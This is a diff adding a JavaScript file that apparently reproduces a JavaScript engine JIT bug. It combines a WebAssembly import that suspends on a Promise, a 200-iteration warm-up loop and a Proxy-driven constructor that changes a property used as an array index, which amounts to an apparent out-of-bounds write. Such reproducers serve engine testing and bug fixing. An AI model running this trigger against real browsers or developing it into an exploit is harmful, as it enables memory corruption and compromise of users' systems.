@@ -1,0 +1,48 @@
+var wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60, 0x00, 0x01, 0x71, 0x60, 0x00, 0x01, 0x7f, 0x02, 0x0d, 0x01, 0x03, 0x65, 0x6e, 0x76, 0x01, 0x66, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01, 0x0d, 0x04, 0x01, 0x01, 0x71, 0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x01, 0x0a, 0x0c, 0x01, 0x0a, 0x00, 0x04, 0x7f, 0x10, 0x00, 0x0d, 0x00, 0x00, 0x0b, 0x0b]);
+
+var promise_resolver;
+
+function suspender() {
+    return new Promise(r => {
+        promise_resolver = r;
+    });
+}
+
+var wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {
+    env: {
+        f: suspender
+    }
+});
+var wasm_main = wasm_instance.exports.main;
+
+var victim_obj = {
+    prop: 1
+};
+var target_array = [1.1, 2.2];
+
+function opt_func(is_warmup) {
+    wasm_main();
+    var v = victim_obj.prop;
+    if (!is_warmup) {
+        target_array[v] = 3.3;
+    }
+}
+
+class StateMutator {
+    constructor() {
+        victim_obj.prop = 4.4;
+    }
+}
+
+var proxy = new Proxy(StateMutator, {});
+
+for (var i = 0; i < 200; i++) {
+    victim_obj.prop = 1;
+    opt_func(true);
+    promise_resolver();
+}
+
+victim_obj.prop = 1;
+opt_func(false);
+Reflect.construct(proxy, []);
+promise_resolver();
